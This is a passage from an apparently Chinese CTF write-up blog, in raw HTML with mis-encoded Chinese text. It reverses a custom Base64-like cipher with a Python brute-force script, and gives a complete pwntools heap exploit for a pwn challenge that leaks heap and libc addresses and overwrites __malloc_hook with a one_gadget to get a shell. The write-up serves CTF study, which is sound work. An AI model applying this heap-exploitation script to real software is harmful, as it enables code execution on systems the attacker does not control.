class="line">          ++v2;</span><br><span class="line">          <span class="keyword">if</span> ( !v12 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">        &#125;</span><br><span class="line">        v16 = &amp;aDbeafc24097158[v16 - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">LABEL_18:</span><br><span class="line">        LOBYTE(v16) = *v16;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_20:</span><br><span class="line">  _aeabi_memcpy8(v46, &amp;unk_CDEAD3E8, <span class="number">256</span>);</span><br><span class="line">  v17 = v47;</span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_CDEABD20(v18, v1);</span><br><span class="line">    v47[v18++] = v4[v19];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v18 != <span class="number">256</span> );</span><br><span class="line">  v20 = (v47[<span class="number">0</span>] - <span class="number">41</span>);</span><br><span class="line">  v46[<span class="number">0</span>] = v46[v20];</span><br><span class="line">  v46[v20] = <span class="number">-41</span>;</span><br><span class="line">  v21 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v22 = v46[v21];</span><br><span class="line">    v20 = (v20 + v47[v21] + v22) % <span class="number">256</span>;</span><br><span class="line">    v46[v21++] = v46[v20];</span><br><span class="line">    v46[v20] = v22;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v21 != <span class="number">256</span> );</span><br><span class="line">  v23 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v24 = v23;</span><br><span class="line">  v25 = v4[<span class="number">3</span>];</span><br><span class="line">  v43 = <span class="number">8</span> * (<span class="number">3</span> - <span class="number">-3</span> * (v23 / <span class="number">3</span>));</span><br><span class="line">  v42 = v25 + v43 / <span class="number">6</span>;</span><br><span class="line">  v26 = <span class="built_in">malloc</span>(v42 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v24 )</span><br><span class="line">  &#123;</span><br><span class="line">    v28 = <span class="number">0</span>;</span><br><span class="line">    v29 = <span class="number">0</span>;</span><br><span class="line">    v30 = <span class="number">0</span>;</span><br><span class="line">    v44 = v25;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v28 = (v28 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">      v35 = v46[v28];</span><br><span class="line">      v30 = (v30 + v35) % <span class="number">256</span>;</span><br><span class="line">      v46[v28] = v46[v30];</span><br><span class="line">      v46[v30] = v35;</span><br><span class="line">      v17 = v46[v28];</span><br><span class="line">      v36 = v46[(v35 + v17)] ^ s[v29];</span><br><span class="line">      <span class="keyword">if</span> ( v29 &amp;&amp; (v27 = <span class="number">0xAAAAAAAB</span> * v29 &gt;&gt; <span class="number">32</span>, v37 = <span class="number">3</span> * (v29 / <span class="number">3</span>), v37 != v29) )</span><br><span class="line">      &#123;</span><br><span class="line">        v31 = v29 == <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v29 != <span class="number">1</span> )</span><br><span class="line">          v31 = v37 + <span class="number">1</span> == v29;</span><br><span class="line">        <span class="keyword">if</span> ( v31 )</span><br><span class="line">        &#123;</span><br><span class="line">          v32 = aAbcdefghijklmn;</span><br><span class="line">          v26[v44 + v29] = aAbcdefghijklmn[v26[v44 + v29] | (v36 &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">          v17 = &amp;v26[v44 + v29];</span><br><span class="line">          v27 = <span class="number">4</span> * v36 &amp; <span class="number">0x3C</span>;</span><br><span class="line">          v17[<span class="number">1</span>] = v27;</span><br><span class="line">          <span class="keyword">if</span> ( v29 + <span class="number">1</span> &gt;= v24 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v33 = v29 == <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v29 != <span class="number">2</span> )</span><br><span class="line">            v33 = v37 + <span class="number">2</span> == v29;</span><br><span class="line">          <span class="keyword">if</span> ( v33 )</span><br><span class="line">          &#123;</span><br><span class="line">            v17 = (v36 &amp; <span class="number">0xC0</span>);</span><br><span class="line">            v34 = v44++ + v29;</span><br><span class="line">            v26[v34] = aAbcdefghijklmn[v26[v34] | (v17 &gt;&gt; <span class="number">6</span>)] ^ <span class="number">0xF</span>;</span><br><span class="line">            v27 = &amp;v26[v34];</span><br><span class="line">            *(v27 + <span class="number">1</span>) = aAbcdefghijklmn[v36 &amp; <span class="number">0x3F</span>];</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v26[v44 + v29] = aAbcdefghijklmn[v36 &gt;&gt; <span class="number">2</span>] ^ <span class="number">7</span>;</span><br><span class="line">        v17 = &amp;v26[v44 + v29];</span><br><span class="line">        v27 = <span class="number">16</span> * v36 &amp; <span class="number">0x30</span>;</span><br><span class="line">        v17[<span class="number">1</span>] = v27;</span><br><span class="line">        <span class="keyword">if</span> ( v29 + <span class="number">1</span> &gt;= v24 )</span><br><span class="line">        &#123;</span><br><span class="line">          v38 = aAbcdefghijklmn[v27];</span><br><span class="line">          *(v17 + <span class="number">1</span>) = <span class="string">&#x27;;;&#x27;</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v29;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v29 &lt; v24 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v43 )</span><br><span class="line">    &#123;</span><br><span class="line">      v32 = <span class="number">1</span>;</span><br><span class="line">      v17 = v42;</span><br><span class="line">      v39 = &amp;byte_CDEAD4E8;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v27 = v26[v25++];</span><br><span class="line">        v40 = *v39++;</span><br><span class="line">        <span class="keyword">if</span> ( v40 != v27 )</span><br><span class="line">          v32 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v25 &lt; v42 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v32 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v26 = (_stack_chk_guard - v48);</span><br><span class="line">    <span class="keyword">if</span> ( _stack_chk_guard == v48 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_53:</span><br><span class="line">    v38 = v32[v27];</span><br><span class="line">    v17[<span class="number">2</span>] = <span class="string">&#x27;4&#x27;</span>;</span><br><span class="line">LABEL_43:</span><br><span class="line">    v17[<span class="number">1</span>] = v38;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v32;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¹ä¸€çœ‹å¾ˆåƒ BASE 64 ç®—æ³•ï¼Œè€Œä¸”è¿˜ç»™å‡ºäº†â€œè¡¨ç›˜â€å’Œå¯†æ–‡</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">!:#&quot;,0x24,&quot;%&amp;()+-*/`~_[]&#123;&#125;?&lt;&gt;,.@^abcdefghijklmnopqrstuvwxyz01234</span><br><span class="line"></span><br><span class="line">&#123;9*8ga*l!Tn?@#fj&#x27;j$\g;;</span><br></pre></td></tr></table></figure></div>

<p>ä½†æ˜¯æ‰¾äº†å¾ˆå¤š BASE64 ç®—æ³•(å„ç§è¯­è¨€çš„éƒ½è¯•äº†ä¸€æ¬¡)ï¼Œæ²¡æœ‰ä¸€ä¸ªèƒ½å¤Ÿæ­£å¸¸è§£ç ï¼Œåæ¥é€šè¿‡è°ƒè¯•ä»”ç»†åˆ†æäº†ä¸€ä¸‹ä»£ç ï¼Œå‘ç°ç®—æ³•è™½ç„¶å’Œ BASE64 å¾ˆåƒï¼Œä½†æ˜¯é‡Œé¢å¤¹æ‚äº†é¢å¤–çš„æ“ä½œï¼Œä¾‹å¦‚å¼‚æˆ–å’Œç§»ä½ç­‰ç­‰ï¼Œå°†ç®—æ³•æ•´ç†å‡ºæ¥ï¼Œç„¶åç¼–å†™äº†ä¸€ä¸ª python è„šæœ¬å°è¯•è§£å¯†æˆåŠŸã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">enc = <span class="string">r&quot; &#123;9*8ga*l!Tn?@#fj&#x27;j$\g;;&quot;</span></span><br><span class="line">table = <span class="string">r&quot;!:#$%&amp;()+-*/`~_[]&#123;&#125;?&lt;&gt;,.@^abcdefghijklmnopqrstuvwxyz0123456789\&#x27;;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">            <span class="keyword">if</span>((<span class="built_in">ord</span>(table[x &gt;&gt; <span class="number">2</span>]) ^ <span class="number">7</span>) == <span class="built_in">ord</span>(enc[<span class="number">20</span>]) <span class="keyword">and</span> \</span><br><span class="line">                <span class="built_in">ord</span>(table[((<span class="number">16</span> * x) &amp; <span class="number">48</span>) | (y &gt;&gt; <span class="number">4</span>)]) == <span class="built_in">ord</span>(enc[<span class="number">21</span>]) <span class="keyword">and</span> \</span><br><span class="line">               (<span class="built_in">ord</span>(table[((<span class="number">4</span> * y) &amp; <span class="number">0x3c</span>) | (z &gt;&gt; <span class="number">6</span>)]) ^ <span class="number">0xf</span>) == <span class="built_in">ord</span>(enc[<span class="number">22</span>]) <span class="keyword">and</span> \</span><br><span class="line">                <span class="built_in">ord</span>(table[z &amp; <span class="number">0x3f</span>]) == <span class="built_in">ord</span>(enc[<span class="number">23</span>])):</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(x ^ <span class="number">0x08</span>),<span class="built_in">chr</span>(y ^ <span class="number">0x38</span>),<span class="built_in">chr</span>(z ^ <span class="number">0x90</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># fu0kzHp2aqtZAuY64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        <span class="keyword">if</span>((<span class="built_in">ord</span>(table[x &gt;&gt; <span class="number">2</span>]) ^ <span class="number">7</span>) == <span class="built_in">ord</span>(enc[<span class="number">20</span>]) <span class="keyword">and</span> \</span><br><span class="line">            <span class="built_in">ord</span>(table[((<span class="number">16</span> * x) &amp; <span class="number">48</span>) | (y &gt;&gt; <span class="number">4</span>)]) == <span class="built_in">ord</span>(enc[<span class="number">21</span>])):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(x ^ <span class="number">0x08</span>),<span class="built_in">chr</span>(y ^ <span class="number">0x38</span>))</span><br><span class="line"><span class="comment"># ä¸‰ä¸ªå­—ç¬¦è½¬4ä¸ªå­—ç¬¦ï¼Œå†…éƒ¨æ•°æ®éœ€è¦æ‰‹åŠ¨è½¬æ¢</span></span><br></pre></td></tr></table></figure></div>

<p>æœ€åå¯ä»¥è§£å‡ºå¯†ç ä¸º  fu0kzHp2aqtZAuY64</p>
<h2 id="æ‹¯æ•‘å•èº«ç‹—"><a href="#æ‹¯æ•‘å•èº«ç‹—" class="headerlink" title="æ‹¯æ•‘å•èº«ç‹—"></a>æ‹¯æ•‘å•èº«ç‹—</h2><p>è¿™æ˜¯ä¸€é“æ¯”è¾ƒç®€å•çš„ pwn é¢˜ï¼Œå…¶ä¸»è¦æ¼æ´ç‚¹åœ¨ç¼–è¾‘å †å—çš„æ—¶å€™ index ä¼šè¶Šç•Œã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¶Šç•Œçš„æŒ‡é’ˆå»ä¿®æ”¹å…¶ä»–å †å—ï¼Œä¾‹å¦‚ edit_singledog å´ä¿®æ”¹äº† luckydogã€‚</p>
<p>é¢˜ç›®çš„ä¸€å¤§å‘ç‚¹åœ¨äºæ²¡æœ‰ç»™å‡º libcï¼Œä¹Ÿå°±æ˜¯è¯´ 2.23 å’Œ 2.27 ä¸¤ä¸ªç‰ˆæœ¬éƒ½æœ‰å¯èƒ½ï¼Œæˆ‘ä¸€å¼€å§‹ç¼–å†™äº† 2.23 çš„åˆ©ç”¨è„šæœ¬ï¼Œæœ¬åœ°æµ‹è¯•é€šè¿‡ï¼Œä½†æ˜¯æ‹¿åˆ°è¿œç¨‹æœåŠ¡å™¨å°±ä¼šå´©æºƒï¼Œæ£€æŸ¥åŸå› æ˜¯åœ°å€æ²¡æœ‰æ­£ç¡®çš„æ³„éœ²ï¼ŒçŒœæµ‹è¿œç¨‹æœåŠ¡å™¨æ˜¯ 2.27 ç‰ˆæœ¬çš„ libcï¼Œç”±äº 2.27 å­˜åœ¨ tcache æœºåˆ¶ï¼Œæ‰€ä»¥éœ€è¦å…ˆå°† tcache å¡«æ»¡ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./apwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&quot;DEBUG&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_single</span>(<span class="params">name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Name:\n&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_lucky</span>(<span class="params">name, name2</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Name&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;your partner&#x27;s name\n&quot;</span>)</span><br><span class="line">    p.sendline(name2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_single</span>(<span class="params">index, name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;which?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Oh,singledog,changing your name can bring you good luck.\n&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_lucky</span>(<span class="params">index, name, name2</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;which?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Oh,luckydog,What is your new name?\n&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;your partner&#x27;s new name\n&quot;</span>)</span><br><span class="line">    p.sendline(name2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 0</span></span><br><span class="line">add_lucky(<span class="string">&quot;bbbbbbbb&quot;</span>, <span class="string">&quot;cccccccc&quot;</span>)</span><br><span class="line">edit_single(<span class="number">80</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">p.recv(<span class="number">11</span>)</span><br><span class="line">heap_addr = u64((<span class="string">&#x27;\x00&#x27;</span> + p.recv(<span class="number">5</span>)).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x200</span></span><br><span class="line">log.info(<span class="string">&quot;heap_addr : 0x%x&quot;</span> % heap_addr)    <span class="comment"># leak heap_addr</span></span><br><span class="line"><span class="comment">#edit_single(80, p64(heap_addr + 0x6d0))    # recover chunk_in_lucky struct</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 1</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 2</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 4</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 5</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 7</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 8</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 10</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 11</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 12</span></span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 13</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 14</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 15</span></span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 16</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 17</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 18</span></span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 19</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 20</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x6c0</span> - <span class="number">0x410</span>))    <span class="comment"># sub lucky_name2 pointer 0x10</span></span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x6d0</span> - <span class="number">0x410</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">save()</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x750</span> - <span class="number">0x410</span>))    <span class="comment"># sub lucky_name2 pointer 0x10</span></span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x760</span> - <span class="number">0x410</span>))</span><br><span class="line">save()</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x7e0</span> - <span class="number">0x410</span>))    <span class="comment"># sub lucky_name2 pointer 0x10</span></span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x7f0</span> - <span class="number">0x410</span>))</span><br><span class="line">save()</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x870</span> - <span class="number">0x410</span>))    <span class="comment"># sub lucky_name2 pointer 0x10</span></span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x880</span> - <span class="number">0x410</span>))</span><br><span class="line">save()</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x900</span> - <span class="number">0x410</span>))    <span class="comment"># sub lucky_name2 pointer 0x10</span></span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x910</span> - <span class="number">0x410</span>))</span><br><span class="line">save()</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x990</span> - <span class="number">0x410</span>))    <span class="comment"># sub lucky_name2 pointer 0x10</span></span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x9a0</span> - <span class="number">0x410</span>))</span><br><span class="line">save()</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0xa20</span> - <span class="number">0x410</span>))    <span class="comment"># sub lucky_name2 pointer 0x10</span></span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0xa30</span> - <span class="number">0x410</span>))</span><br><span class="line">save()</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0xab0</span> - <span class="number">0x410</span>))    <span class="comment"># sub lucky_name2 pointer 0x10</span></span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0xac0</span> - <span class="number">0x410</span>))</span><br><span class="line">save()</span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">17</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">p.recv(<span class="number">10</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebd0a</span></span><br><span class="line">log.info(<span class="string">&quot;libc_addr : 0x%x&quot;</span> % libc_addr)    <span class="comment"># leak necessary address</span></span><br><span class="line">malloc_hook = libc_addr + libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">one_gadget = libc_addr + <span class="number">0x10a38c</span></span><br><span class="line">log.info(<span class="string">&quot;malloc_hook : 0x%x&quot;</span> % malloc_hook)</span><br><span class="line">log.info(<span class="string">&quot;one_gadget : 0x%x&quot;</span> % one_gadget)</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(malloc_hook))</span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(one_gadget))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="å½±åˆ†èº«ä¹‹æœ¯"><a href="#å½±åˆ†èº«ä¹‹æœ¯" class="headerlink" title="å½±åˆ†èº«ä¹‹æœ¯"></a>å½±åˆ†èº«ä¹‹æœ¯</h2><p>æ‹¿åˆ°é¢˜ç›®ä¸Šç½‘æœç´¢äº†ä¸€ä¸‹ï¼Œå’ŒæŸå¹´çš„é¢˜ç›®å¾ˆç›¸ä¼¼ï¼ŒæŒ‰ç…§ç½‘ä¸Šçš„ wpï¼Œå°†ç¨‹åºä¸­å±è”½å³é”®èœå•çš„å‡½æ•°è¿›è¡Œ patchï¼Œç„¶åè¿è¡Œç¨‹åºé€šè¿‡æŸ¥çœ‹æºä»£ç å¾—åˆ°ä¸€æ®µ js</p>
<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">sptWBCallback</span>(<span class="params">spt_wb_id, spt_wb_name, optionstr</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        url = <span class="string">&#x27;#sptWBCallback:id=&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        url = url + spt_wb_id + <span class="string">&#x27;;eventName=&#x27;</span> + spt_wb_name;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (optionstr) url = url + <span class="string">&#x27;;params=optionstr&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        location = url;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">ckpswd</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">	key = <span class="string">&quot;simpower91&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	a = <span class="variable language_">document</span>.<span class="property">all</span>.<span class="property">pswd</span>.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span> (a.<span class="title function_">indexOf</span>(key) == <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		l = a.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">		i = key.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">sptWBCallback</span>(a.<span class="title function_">substring</span>(i, l));</span></span><br><span class="line"><span class="language-javascript">	&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">alert</span>(<span class="string">&quot;wrong!&lt;&quot;</span> + a + <span class="string">&quot;&gt; is not my GUID ;-)&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span> <span class="string">&quot;1234&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">ok</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">alert</span>(<span class="string">&quot;congratulations!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">CTF 2019<span class="symbol">&amp;reg;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    